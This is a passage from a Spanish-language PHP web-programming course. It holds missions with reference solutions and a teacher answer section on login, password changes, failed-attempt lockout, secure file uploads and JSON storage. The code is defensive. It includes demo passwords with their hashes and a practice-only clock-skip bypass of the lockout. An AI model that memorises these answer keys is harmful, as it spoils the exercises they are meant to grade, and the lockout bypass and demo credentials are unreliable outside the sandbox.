        http_response_code(403);
        exit('Pedido no válido.');
    }
    $usuarios = require __DIR__ . '/usuarios.php';
    $usuario = mb_strtolower(trim($_POST['usuario'] ?? ''));
    if (isset($usuarios[$usuario]) && password_verify($_POST['clave'] ?? '', $usuarios[$usuario]['hash'])) {
        session_regenerate_id(true);
        $_SESSION['usuario'] = $usuario;
        header('Location: socios.php', true, 303);
        exit;
    }
    $error = 'Usuario o contraseña incorrectos.';
}
?>
<h1>Club del Puerto</h1>
<?php if ($error): ?><p><?= e($error) ?></p><?php endif; ?>
<form method="post">
    <input type="hidden" name="csrf" value="<?= csrf() ?>">
    <input name="usuario"> <input type="password" name="clave"> <button>Entrar</button>
</form>
```

`socios.php`
```php
<?php
declare(strict_types=1);
require_once __DIR__ . '/auth.php';
$yo = requerirLogin();
?>
<h1>Hola, <?= e($yo['nombre']) ?></h1>
<ul><li>Fútbol: martes y jueves</li><li>Natación: lunes, miércoles y viernes</li><li>Patín: sábados</li></ul>
<?php if ($yo['rol'] === 'tesorero'): ?><p><a href="tesoreria.php">Tesorería</a></p><?php endif; ?>
<form method="post" action="salir.php"><input type="hidden" name="csrf" value="<?= csrf() ?>"><button>Salir</button></form>
```

`tesoreria.php`
```php
<?php
declare(strict_types=1);
require_once __DIR__ . '/auth.php';
$yo = requerirLogin('tesorero');
?>
<h1>Tesorería</h1>
<p>Recaudación de octubre: $1.284.500,00</p>
```

`salir.php`
```php
<?php
declare(strict_types=1);
require_once __DIR__ . '/auth.php';
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !csrfValido()) {
    http_response_code(405);
    exit('Para salir, usá el botón.');
}
$_SESSION = [];
session_destroy();
header('Location: login.php', true, 303);
exit;
```

`generar.php`
```php
<?php
// Uso: php generar.php  → imprime los hashes para copiar en usuarios.php
foreach (['ana' => 'ancla123', 'beto' => 'faro2026', 'caro' => 'timon77'] as $usuario => $clave) {
    echo $usuario, ': ', password_hash($clave, PASSWORD_DEFAULT), PHP_EOL;
}
```

### Misión R03-N06-M3 · El cambio de contraseña

```meta
entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

Escribí `clave.php`, una página para cambiar la contraseña. Para practicar en un
solo archivo, la cuenta vive en la sesión: la primera vez se crea
`$_SESSION['cuenta'] = ['usuario' => 'kira', 'hash' => password_hash('ancla123', PASSWORD_DEFAULT)]`.
El formulario pide la contraseña **actual**, la nueva y su repetición. Reglas:

- la actual tiene que ser correcta (`password_verify`);
- la nueva, de 8 caracteres o más, distinta de la actual y con letras y números;
- la repetición, igual.

Si todo está bien, se guarda el hash nuevo, se regenera el id de sesión y se
muestra `Contraseña cambiada.` Después, para probar, un segundo formulario
**Probar contraseña** dice si una contraseña es la vigente (`Correcta` o
`Incorrecta`). Con CSRF en los dos formularios.

#### Criterio de aprobación

- Pide y verifica la contraseña actual.
- Guarda el hash nuevo y regenera la sesión.
- Los dos formularios tienen CSRF.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Mision 3 - El cambio de contraseña: verificar la actual y guardar el hash nuevo.
session_start();
$_SESSION['csrf'] ??= bin2hex(random_bytes(32));
$_SESSION['cuenta'] ??= ['usuario' => 'kira', 'hash' => password_hash('ancla123', PASSWORD_DEFAULT)];
$mensajes = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
        http_response_code(403);
        exit('Pedido no válido.');
    }
    if (($_POST['accion'] ?? '') === 'probar') {
        $mensajes[] = password_verify($_POST['prueba'] ?? '', $_SESSION['cuenta']['hash']) ? 'Correcta' : 'Incorrecta';
    } else {
        $actual = $_POST['actual'] ?? '';
        $nueva = $_POST['nueva'] ?? '';
        if (!password_verify($actual, $_SESSION['cuenta']['hash'])) {
            $mensajes[] = 'La contraseña actual no es correcta.';
        } elseif (strlen($nueva) < 8 || !preg_match('/[a-zA-Z]/', $nueva) || !preg_match('/\d/', $nueva)) {
            $mensajes[] = 'La nueva necesita 8 caracteres o más, con letras y números.';
        } elseif ($nueva === $actual) {
            $mensajes[] = 'La nueva tiene que ser distinta de la actual.';
        } elseif ($nueva !== ($_POST['repetida'] ?? '')) {
            $mensajes[] = 'Las contraseñas nuevas no coinciden.';
        } else {
            $_SESSION['cuenta']['hash'] = password_hash($nueva, PASSWORD_DEFAULT);
            session_regenerate_id(true);
            $mensajes[] = 'Contraseña cambiada.';
        }
    }
}
?>
<h1>Cambiar la contraseña de <?= htmlspecialchars($_SESSION['cuenta']['usuario']) ?></h1>
<?php foreach ($mensajes as $m): ?><p><?= htmlspecialchars($m) ?></p><?php endforeach; ?>
<form method="post">
    <input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
    <input type="password" name="actual"> <input type="password" name="nueva"> <input type="password" name="repetida">
    <button name="accion" value="cambiar">Cambiar</button>
</form>
<form method="post">
    <input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
    <input type="password" name="prueba"> <button name="accion" value="probar">Probar contraseña</button>
</form>
```

### Encargo R03-N06-E1 · El bloqueo por intentos

```meta
entrega: codigo
entorno: local
monedas: 1
xp: 15
```

#### Consigna

Un home banking de juguete necesita frenar a quien prueba contraseñas. Escribí
`banco.php` con un login (usuarios en una constante con sus hashes) que:

- cuenta los intentos fallidos **por usuario** (en `$_SESSION['fallos'][usuario]`);
- al tercer fallo, bloquea ese usuario **por 60 segundos** (guardando `time()` del
  bloqueo) y responde `Usuario bloqueado. Probá en N segundos.` con código 429;
- el bloqueo no revela si la contraseña era correcta: mientras dura, ni siquiera se
  llama a `password_verify`;
- al entrar bien, reinicia los fallos de ese usuario, regenera la sesión y muestra
  `Bienvenida, NOMBRE.` con el saldo;
- los mensajes de error nunca dicen si el usuario existe.

Para poder probarlo sin esperar, el tiempo actual sale de una función `ahora(): int`
que devuelve `time()` más `$_SESSION['adelanto'] ?? 0`, y un enlace
`?adelantar=61` suma 61 segundos (solo para practicar; en un sistema real no
existe).

#### Criterio de aprobación

- Cuenta fallos por usuario y bloquea al tercero durante 60 segundos.
- Responde 429 durante el bloqueo sin verificar la contraseña.
- Reinicia los fallos al entrar bien y regenera la sesión.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Encargo - El bloqueo por intentos: fallos por usuario y un tiempo de espera.
session_start();
const USUARIOS = [
    'kira' => ['nombre' => 'Kira', 'saldo' => 152300, 'hash' => '$2y$10$R7flf57cYzLAnMr14xX56OhKUJ5qlAco9VY/EbWmghiXoQB.vb5yS'],
    'bron' => ['nombre' => 'Bron', 'saldo' => 8900, 'hash' => '$2y$10$sY48d8IabcyzFGOVp12ZpuujEDnEgiSNQdtdVIB1rIGD4/BG9LYF6'],
];
const MAX_FALLOS = 3;
const BLOQUEO_SEGUNDOS = 60;

function ahora(): int
{
    return time() + ($_SESSION['adelanto'] ?? 0);
}

if (isset($_GET['adelantar'])) {
    $_SESSION['adelanto'] = ($_SESSION['adelanto'] ?? 0) + (int) $_GET['adelantar'];
}
$_SESSION['csrf'] ??= bin2hex(random_bytes(32));
$_SESSION['fallos'] ??= [];
$_SESSION['bloqueos'] ??= [];
$mensaje = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
        http_response_code(403);
        exit('Pedido no válido.');
    }
    $usuario = mb_strtolower(trim($_POST['usuario'] ?? ''));
    $bloqueadoHasta = ($_SESSION['bloqueos'][$usuario] ?? 0) + BLOQUEO_SEGUNDOS;
    if (isset($_SESSION['bloqueos'][$usuario]) && ahora() < $bloqueadoHasta) {
        http_response_code(429);
        $mensaje = 'Usuario bloqueado. Probá en ' . ($bloqueadoHasta - ahora()) . ' segundos.';
    } else {
        unset($_SESSION['bloqueos'][$usuario]);
        $datos = USUARIOS[$usuario] ?? null;
        if ($datos !== null && password_verify($_POST['clave'] ?? '', $datos['hash'])) {
            $_SESSION['fallos'][$usuario] = 0;
            session_regenerate_id(true);
            $mensaje = "Bienvenida, {$datos['nombre']}. Saldo: $" . number_format($datos['saldo'], 2, ',', '.');
        } else {
            $_SESSION['fallos'][$usuario] = ($_SESSION['fallos'][$usuario] ?? 0) + 1;
            if ($_SESSION['fallos'][$usuario] >= MAX_FALLOS) {
                $_SESSION['bloqueos'][$usuario] = ahora();
                $_SESSION['fallos'][$usuario] = 0;
                http_response_code(429);
                $mensaje = 'Usuario bloqueado. Probá en ' . BLOQUEO_SEGUNDOS . ' segundos.';
            } else {
                $mensaje = 'Usuario o contraseña incorrectos.';
            }
        }
    }
}
?>
<h1>Banco del Puerto</h1>
<?php if ($mensaje !== null): ?><p><?= htmlspecialchars($mensaje) ?></p><?php endif; ?>
<form method="post">
    <input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
    <input name="usuario"> <input type="password" name="clave"> <button>Entrar</button>
</form>
<p><a href="?adelantar=61">Adelantar el reloj 61 segundos (práctica)</a></p>
```

### Prueba del sello

#### ¿Por qué no se guardan las contraseñas tal como las escribió la persona?

Porque si alguien roba los datos, se lleva todas las contraseñas. Se guarda un hash que no se puede revertir.

#### ¿Por qué no se compara `password_hash($clave) === $hash`?

Porque `password_hash` usa una sal al azar y da un hash distinto cada vez; para comprobar se usa `password_verify($clave, $hash)`.

#### ¿Para qué sirve `session_regenerate_id(true)` al iniciar sesión?

Para darle al usuario un identificador de sesión nuevo: si alguien conocía el anterior, ya no le sirve.

#### ¿Por qué el mensaje de error dice "usuario o contraseña incorrectos"?

Para no revelar si el usuario existe: así nadie puede averiguar qué cuentas hay.

#### ¿Alcanza con esconder el enlace a una página de administración?

No: la página misma tiene que revisar que el usuario esté logueado y tenga el rol, porque cualquiera puede escribir la dirección.

### Soluciones (docente)

Nodo nuevo. Los hashes de los ejemplos corresponden a `ancla123`, `faro2026` y `timon77`. Todavía sin base de datos: los usuarios están en un archivo o en la sesión; en R04-N08 se pasa el login a MariaDB. En el encargo, el "adelanto" del reloj es solo para practicar sin esperar: conviene aclararlo en clase.

## R03-N07 · Subir archivos y guardar en JSON

```meta
tipo: tema
padre: R03-N06
precio: 10
criatura: goblin
temas: web.subidas, arch.json
usa: html.formularios
```

### Crónica

A la Oficina de Correos no llegan solo cartas: llegan fotos, planos, facturas. Un día alguien mandó un "retrato" que en realidad era una trampa con código adentro, y casi incendia el archivo. Desde entonces, un revisor mira **qué hay de verdad** dentro de cada paquete antes de guardarlo, le pone un número nuevo y lo archiva en un cajón donde nadie puede ejecutarlo.

—Recibir archivos es recibir paquetes de desconocidos —dice {mentor}—. Se revisa el tamaño, se mira el contenido real y no el nombre que trae, y se guarda con un nombre nuestro. Y mientras no tengamos bodega, {heroe}, los registros se guardan en un archivo **JSON**: texto ordenado que cualquier lenguaje entiende.

### Objetivos

- Subir archivos con un formulario `multipart/form-data` y leer `$_FILES`.
- Revisar los errores de subida y el tamaño.
- Validar el tipo real con `finfo` (no la extensión ni lo que dice el navegador).
- Guardar con `move_uploaded_file` y un nombre generado por el sistema.
- Guardar y leer datos en un archivo JSON con `json_encode`/`json_decode` y bloqueo.

### Antes de empezar

- Formularios con POST y seguridad (R03-N03 a R03-N05).

### Explicación

#### El formulario
Para mandar archivos, el formulario necesita `enctype="multipart/form-data"`:
```html
<form method="post" enctype="multipart/form-data">
    <input type="file" name="foto" accept="image/png,image/jpeg">
    <button>Subir</button>
</form>
```
Sin el `enctype`, el archivo **no se manda** (y `$_FILES` queda vacío).

#### `$_FILES`
Cada archivo llega como un array:
```php
$_FILES['foto'] = [
    'name' => 'mi foto.png',       // el nombre en la compu del visitante (¡no confiable!)
    'type' => 'image/png',         // lo que dice el navegador (¡tampoco confiable!)
    'tmp_name' => '/tmp/phpA1b2',  // dónde lo dejó PHP, temporalmente
    'error' => 0,                  // UPLOAD_ERR_OK si salió bien
    'size' => 70,                  // en bytes
];
```
El archivo queda en `tmp_name` y **se borra al terminar el pedido** si no lo movés.

#### Revisar en orden
```php
$archivo = $_FILES['foto'] ?? null;
if ($archivo === null || $archivo['error'] === UPLOAD_ERR_NO_FILE) {
    $error = 'Elegí un archivo.';
} elseif ($archivo['error'] !== UPLOAD_ERR_OK) {
    $error = 'El archivo no se pudo subir (¿es muy grande?).';   // INI_SIZE, PARTIAL…
} elseif ($archivo['size'] > 2 * 1024 * 1024) {
    $error = 'El archivo pasa los 2 MB.';
} else {
    $tipo = (new finfo(FILEINFO_MIME_TYPE))->file($archivo['tmp_name']);   // mira el CONTENIDO
    $extensiones = ['image/png' => 'png', 'image/jpeg' => 'jpg'];
    if (!isset($extensiones[$tipo])) {
        $error = 'Solo se aceptan imágenes PNG o JPG.';
    }
}
```
- `finfo` lee los primeros bytes del archivo y dice qué es **de verdad**. Un archivo
  llamado `foto.png` que en realidad es PHP da `text/x-php`.
- PHP tiene sus propios límites (`upload_max_filesize`, `post_max_size` en
  `php.ini`, por defecto 2 MB y 8 MB): si el archivo los pasa, llega con
  `error = UPLOAD_ERR_INI_SIZE`.

#### Guardar con un nombre nuestro
```php
$nombre = bin2hex(random_bytes(8)) . '.' . $extensiones[$tipo];   // a1b2c3d4e5f6a7b8.png
move_uploaded_file($archivo['tmp_name'], __DIR__ . '/subidas/' . $nombre);
```
**Nunca** uses el nombre que mandó el visitante para guardar: puede traer `../`
(para escribir en otra carpeta), caracteres raros o pisar otro archivo. El nombre
original, si querés mostrarlo, se guarda aparte como dato.

`move_uploaded_file` solo mueve archivos que llegaron por una subida real (no te
pueden hacer mover `/etc/passwd`).

#### Dónde guardar
- Lo **público** (fotos de productos que se muestran a todos) en una carpeta
  servida por la web, con nombres generados y sabiendo que es una imagen.
- Lo **privado** (comprobantes, documentos) **fuera** de la carpeta pública, y se
  entrega con un script PHP que revisa permisos (así lo hace esta misma
  plataforma con los comprobantes y las entregas).
- Nunca se ejecuta lo subido: con los nombres generados y la extensión fijada por
  vos, un `.php` disfrazado no llega a ser `.php`.

#### Guardar datos en JSON
Hasta tener base de datos (rama 4), los registros pueden ir en un archivo JSON:
```php
function leer(string $ruta): array
{
    return file_exists($ruta) ? json_decode(file_get_contents($ruta), true, flags: JSON_THROW_ON_ERROR) : [];
}

function guardar(string $ruta, array $datos): void
{
    file_put_contents($ruta, json_encode($datos, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}
```
- `json_decode(…, true)` devuelve arrays asociativos (sin el `true`, objetos).
- `JSON_THROW_ON_ERROR` hace que un JSON roto lance una excepción en lugar de
  devolver `null` en silencio.
- `LOCK_EX` bloquea el archivo mientras se escribe, para que dos pedidos al mismo
  tiempo no lo mezclen.
- Sirve para poco volumen. Con muchos datos o muchos usuarios a la vez, se usa una
  base de datos.

### Código de ejemplo

`galeria.php`
```php
<?php
declare(strict_types=1);
/*
 * La galería del faro: subir imágenes validadas y registrar cada una en un JSON.
 */
session_start();
const MAX_BYTES = 2 * 1024 * 1024;
const TIPOS = ['image/png' => 'png', 'image/jpeg' => 'jpg', 'image/webp' => 'webp'];
const REGISTRO = __DIR__ . '/datos/galeria.json';
const CARPETA = __DIR__ . '/subidas';

function e(string $t): string
{
    return htmlspecialchars($t, ENT_QUOTES, 'UTF-8');
}

function leerRegistro(): array
{
    return file_exists(REGISTRO) ? json_decode(file_get_contents(REGISTRO), true, flags: JSON_THROW_ON_ERROR) : [];
}

function guardarRegistro(array $fotos): void
{
    if (!is_dir(dirname(REGISTRO))) {
        mkdir(dirname(REGISTRO), 0775, true);
    }
    file_put_contents(REGISTRO, json_encode($fotos, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}

/** Valida la subida y devuelve la extensión a usar, o lanza una excepción con el motivo. */
function validarImagen(?array $archivo): string
{
    if ($archivo === null || $archivo['error'] === UPLOAD_ERR_NO_FILE) {
        throw new InvalidArgumentException('Elegí una imagen.');
    }
    if ($archivo['error'] !== UPLOAD_ERR_OK) {
        throw new InvalidArgumentException('La imagen no se pudo subir.');
    }
    if ($archivo['size'] > MAX_BYTES) {
        throw new InvalidArgumentException('La imagen pasa los 2 MB.');
    }
    $tipo = (new finfo(FILEINFO_MIME_TYPE))->file($archivo['tmp_name']);
    return TIPOS[$tipo] ?? throw new InvalidArgumentException("No es una imagen permitida (es $tipo).");
}

$_SESSION['csrf'] ??= bin2hex(random_bytes(32));
$error = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
        http_response_code(403);
        exit('Pedido no válido.');
    }
    try {
        $extension = validarImagen($_FILES['foto'] ?? null);
        $titulo = trim($_POST['titulo'] ?? '');
        if ($titulo === '' || mb_strlen($titulo) > 60) {
            throw new InvalidArgumentException('El título va de 1 a 60 caracteres.');
        }
        if (!is_dir(CARPETA)) {
            mkdir(CARPETA, 0775, true);
        }
        $nombre = bin2hex(random_bytes(8)) . '.' . $extension;
        move_uploaded_file($_FILES['foto']['tmp_name'], CARPETA . '/' . $nombre);

        $fotos = leerRegistro();
        $fotos[] = ['archivo' => $nombre, 'titulo' => $titulo, 'original' => $_FILES['foto']['name'], 'bytes' => $_FILES['foto']['size']];
        guardarRegistro($fotos);
        $_SESSION['flash'] = "Subiste «{$titulo}».";
        header('Location: galeria.php', true, 303);
        exit;
    } catch (InvalidArgumentException $ex) {
        $error = $ex->getMessage();
    }
}

$flash = $_SESSION['flash'] ?? null;
unset($_SESSION['flash']);
$fotos = leerRegistro();
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Galería</title></head>
<body>
    <h1>Galería del faro</h1>
    <?php if ($flash !== null): ?><p><?= e($flash) ?></p><?php endif; ?>
    <?php if ($error !== null): ?><p><strong><?= e($error) ?></strong></p><?php endif; ?>
    <form method="post" enctype="multipart/form-data">
        <input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
        <input name="titulo" placeholder="Título">
        <input type="file" name="foto" accept="image/png,image/jpeg,image/webp">
        <button>Subir</button>
    </form>
    <p><?= count($fotos) ?> foto/s</p>
    <?php foreach ($fotos as $f): ?>
        <figure>
            <img src="subidas/<?= e($f['archivo']) ?>" alt="<?= e($f['titulo']) ?>" width="120">
            <figcaption><?= e($f['titulo']) ?> (<?= e($f['original']) ?>, <?= $f['bytes'] ?> bytes)</figcaption>
        </figure>
    <?php endforeach; ?>
</body>
</html>
```

### ¿Para qué sirve?

Subir fotos de productos, el comprobante de un pago, el CV en una postulación, la tarea en un campus: todo es un formulario con archivos. Hacerlo mal es una de las formas más comunes de que un servidor termine hackeado (alguien sube un `.php` y lo ejecuta). Y JSON es el formato con el que hablan casi todos los sistemas: APIs, configuraciones, exportaciones.

### Errores habituales

**Esqueleto: `$_FILES` vacío.** Falta `enctype="multipart/form-data"` en el
`<form>`, o el formulario es GET.

**Troll: confiar en el nombre o en `type`.** `foto.png` puede ser un script, y
`$_FILES['foto']['type']` lo escribe el navegador (o el atacante). El tipo se mira
con `finfo`, y el nombre se genera.

**Goblin: el archivo que pasa el límite de PHP.** Si pasa `upload_max_filesize`,
llega con `error = UPLOAD_ERR_INI_SIZE` y `tmp_name` vacío: revisá el `error` antes
que nada. Si pasa `post_max_size`, directamente llegan vacíos `$_POST` **y**
`$_FILES`.

**Troll: guardar con el nombre original.** `move_uploaded_file(…, 'subidas/' .
$_FILES['foto']['name'])` permite pisar archivos y, con `../`, escribir fuera de la
carpeta.

**Ogro: el JSON que se rompe en silencio.** Sin `JSON_THROW_ON_ERROR`,
`json_decode` de un archivo roto devuelve `null`, y el programa sigue como si no
hubiera datos (y en el próximo guardado los pisa todos).

### Misión R03-N07-M1 · El buzón de comprobantes

```meta
entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

El club del puerto recibe los comprobantes de pago de las cuotas. Escribí
`comprobantes.php` con un formulario (con CSRF) que pide el DNI del socio (7 u 8
dígitos) y el archivo del comprobante. Aceptá **solo PDF, PNG o JPG** (validados con
`finfo`) de hasta **1 MB**. Guardá cada archivo en `privado/` con el nombre
`DNI-FECHAHORA-azar.EXT` (`date('Ymd-His')` y `bin2hex(random_bytes(4))`), y
registrá cada subida en `privado/comprobantes.json` (DNI, archivo, tipo, tamaño y
fecha). La página lista las últimas 5 subidas (más nuevas primero) **sin** enlaces a
los archivos (son privados).

#### Criterio de aprobación

- Valida DNI, tamaño y tipo real con `finfo`.
- Genera el nombre del archivo y lo guarda con `move_uploaded_file`.
- Registra en JSON con `LOCK_EX` y muestra las últimas 5.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Mision 1 - El buzón de comprobantes: validar el tipo real y registrar en JSON.
session_start();
date_default_timezone_set('America/Argentina/Buenos_Aires');
const TIPOS = ['application/pdf' => 'pdf', 'image/png' => 'png', 'image/jpeg' => 'jpg'];
const CARPETA = __DIR__ . '/privado';
const REGISTRO = CARPETA . '/comprobantes.json';

$_SESSION['csrf'] ??= bin2hex(random_bytes(32));
$mensaje = null;
if (!is_dir(CARPETA)) {
    mkdir(CARPETA, 0775, true);
}
$registro = file_exists(REGISTRO) ? json_decode(file_get_contents(REGISTRO), true, flags: JSON_THROW_ON_ERROR) : [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
        http_response_code(403);
        exit('Pedido no válido.');
    }
    $dni = trim($_POST['dni'] ?? '');
    $archivo = $_FILES['comprobante'] ?? null;
    if (!preg_match('/^\d{7,8}$/', $dni)) {
        $mensaje = 'El DNI tiene 7 u 8 dígitos.';
    } elseif ($archivo === null || $archivo['error'] !== UPLOAD_ERR_OK) {
        $mensaje = 'Adjuntá el comprobante.';
    } elseif ($archivo['size'] > 1024 * 1024) {
        $mensaje = 'El comprobante pasa 1 MB.';
    } else {
        $tipo = (new finfo(FILEINFO_MIME_TYPE))->file($archivo['tmp_name']);
        if (!isset(TIPOS[$tipo])) {
            $mensaje = 'Solo PDF, PNG o JPG.';
        } else {
            $nombre = $dni . '-' . date('Ymd-His') . '-' . bin2hex(random_bytes(4)) . '.' . TIPOS[$tipo];
            move_uploaded_file($archivo['tmp_name'], CARPETA . '/' . $nombre);
            $registro[] = ['dni' => $dni, 'archivo' => $nombre, 'tipo' => $tipo, 'bytes' => $archivo['size'], 'fecha' => date('d/m/Y H:i')];
            file_put_contents(REGISTRO, json_encode($registro, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
            $mensaje = "Recibimos el comprobante de $dni.";
        }
    }
}
$ultimos = array_slice(array_reverse($registro), 0, 5);
?>
<h1>Comprobantes de cuota</h1>
<?php if ($mensaje !== null): ?><p><?= htmlspecialchars($mensaje) ?></p><?php endif; ?>
<form method="post" enctype="multipart/form-data">
    <input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
    <input name="dni" placeholder="DNI"> <input type="file" name="comprobante"> <button>Enviar</button>
</form>
<h2>Últimos recibidos</h2>
<ul>
    <?php foreach ($ultimos as $r): ?>
        <li><?= htmlspecialchars($r['dni']) ?> · <?= $r['tipo'] ?> · <?= $r['bytes'] ?> bytes · <?= $r['fecha'] ?></li>
    <?php endforeach; ?>
</ul>
```

### Misión R03-N07-M2 · La agenda en JSON

```meta
entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

Escribí `agenda.php`, una agenda de contactos que se guarda en `datos/agenda.json`.
Tiene:

- un formulario para **agregar** (nombre obligatorio, teléfono y email opcionales
  pero válidos si vienen);
- la lista ordenada por nombre, con un botón **Borrar** en cada contacto (POST con
  el **id** del contacto: al agregar, cada uno recibe un id con
  `bin2hex(random_bytes(4))`);
- un buscador GET (`?q=`) que filtra por nombre;
- un enlace **Descargar JSON** (`?descargar=1`) que responde con
  `Content-Type: application/json` y `Content-Disposition: attachment;
  filename="agenda.json"`, con el contenido del archivo.

Leé y guardá con funciones `leer()` y `guardar()` (con `JSON_THROW_ON_ERROR` y
`LOCK_EX`), y usá CSRF y PRG.

#### Criterio de aprobación

- Los datos persisten en un archivo JSON entre pedidos.
- Agregar y borrar son POST con CSRF y redirigen.
- La descarga manda los encabezados correctos.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Mision 2 - La agenda en JSON: un ABM chico guardado en un archivo.
session_start();
const ARCHIVO = __DIR__ . '/datos/agenda.json';

function leer(): array
{
    return file_exists(ARCHIVO) ? json_decode(file_get_contents(ARCHIVO), true, flags: JSON_THROW_ON_ERROR) : [];
}

function guardar(array $contactos): void
{
    if (!is_dir(dirname(ARCHIVO))) {
        mkdir(dirname(ARCHIVO), 0775, true);
    }
    file_put_contents(ARCHIVO, json_encode(array_values($contactos), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}

function e(string $t): string
{
    return htmlspecialchars($t, ENT_QUOTES, 'UTF-8');
}

$_SESSION['csrf'] ??= bin2hex(random_bytes(32));
$contactos = leer();

if (isset($_GET['descargar'])) {
    header('Content-Type: application/json; charset=utf-8');
    header('Content-Disposition: attachment; filename="agenda.json"');
    echo json_encode($contactos, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
        http_response_code(403);
        exit('Pedido no válido.');
    }
    if (($_POST['accion'] ?? '') === 'borrar') {
        $contactos = array_filter($contactos, fn(array $c): bool => $c['id'] !== ($_POST['id'] ?? ''));
        guardar($contactos);
        $_SESSION['flash'] = 'Contacto borrado.';
    } else {
        $nombre = trim($_POST['nombre'] ?? '');
        $telefono = trim($_POST['telefono'] ?? '');
        $email = trim($_POST['email'] ?? '');
        if ($nombre === '') {
            $_SESSION['flash'] = 'Falta el nombre.';
        } elseif ($email !== '' && filter_var($email, FILTER_VALIDATE_EMAIL) === false) {
            $_SESSION['flash'] = 'El email no es válido.';
        } elseif ($telefono !== '' && !preg_match('/^[\d\s+-]{6,20}$/', $telefono)) {
            $_SESSION['flash'] = 'El teléfono no es válido.';
        } else {
            $contactos[] = ['id' => bin2hex(random_bytes(4)), 'nombre' => $nombre, 'telefono' => $telefono, 'email' => $email];
            guardar($contactos);
            $_SESSION['flash'] = "Agregaste a $nombre.";
        }
    }
    header('Location: agenda.php', true, 303);
    exit;
}

$flash = $_SESSION['flash'] ?? null;
unset($_SESSION['flash']);
$q = trim($_GET['q'] ?? '');
$lista = array_filter($contactos, fn(array $c): bool => $q === '' || mb_stripos($c['nombre'], $q) !== false);
usort($lista, fn(array $a, array $b): int => strcmp($a['nombre'], $b['nombre']));
?>
<h1>Agenda del Puerto</h1>
<?php if ($flash !== null): ?><p><?= e($flash) ?></p><?php endif; ?>
<form method="get"><input name="q" value="<?= e($q) ?>"> <button>Buscar</button></form>
<ul>
    <?php foreach ($lista as $c): ?>
        <li><?= e($c['nombre']) ?> <?= e($c['telefono']) ?> <?= e($c['email']) ?>
            <form method="post" style="display:inline">
                <input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
                <input type="hidden" name="id" value="<?= e($c['id']) ?>">
                <button name="accion" value="borrar">Borrar</button>
            </form></li>
    <?php endforeach; ?>
</ul>
<form method="post">
    <input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
    <input name="nombre" placeholder="Nombre"> <input name="telefono" placeholder="Teléfono"> <input name="email" placeholder="Email">
    <button name="accion" value="agregar">Agregar</button>
</form>
<p><a href="?descargar=1">Descargar JSON</a></p>
```

### Misión R03-N07-M3 · El importador de precios

```meta
entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

Un almacén actualiza sus precios subiendo un archivo **CSV** (`codigo;producto;precio`,
con un renglón de títulos). Escribí `importar.php`:

- acepta un archivo de texto (`text/plain` o `text/csv` según `finfo`) de hasta 100 KB;
- lo lee con `fopen` y `fgetcsv($f, null, ';')` (saltando el renglón de títulos);
- valida cada renglón (código de 3 a 10 letras o números, producto no vacío, precio
  numérico positivo) y junta los errores con el número de renglón;
- si no hubo **ningún** error, guarda los precios en `datos/precios.json` (código →
  producto y precio) y muestra cuántos importó; si hubo errores, **no guarda nada** y
  muestra la lista de errores.

La página muestra además la tabla de precios guardada.

#### Criterio de aprobación

- Valida el tipo del archivo y cada renglón.
- Es "todo o nada": con un solo error, no guarda.
- Guarda y muestra los precios desde el JSON.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Mision 3 - El importador de precios: leer un CSV subido, validar todo o nada y guardar en JSON.
session_start();
const ARCHIVO = __DIR__ . '/datos/precios.json';

$_SESSION['csrf'] ??= bin2hex(random_bytes(32));
$errores = [];
$importados = null;
$precios = file_exists(ARCHIVO) ? json_decode(file_get_contents(ARCHIVO), true, flags: JSON_THROW_ON_ERROR) : [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
        http_response_code(403);
        exit('Pedido no válido.');
    }
    $archivo = $_FILES['csv'] ?? null;
    if ($archivo === null || $archivo['error'] !== UPLOAD_ERR_OK || $archivo['size'] > 100 * 1024) {
        $errores[] = 'Subí un CSV de hasta 100 KB.';
    } elseif (!in_array((new finfo(FILEINFO_MIME_TYPE))->file($archivo['tmp_name']), ['text/plain', 'text/csv'], true)) {
        $errores[] = 'El archivo no es de texto.';
    } else {
        $nuevos = [];
        $f = fopen($archivo['tmp_name'], 'r');
        fgetcsv($f, null, ';');                             // títulos
        $numero = 1;
        while (($fila = fgetcsv($f, null, ';')) !== false) {
            $numero++;
            if ($fila === [null]) {
                continue;                                    // renglón vacío
            }
            [$codigo, $producto, $precio] = array_map('trim', array_pad($fila, 3, ''));
            if (!preg_match('/^[A-Za-z0-9]{3,10}$/', $codigo)) {
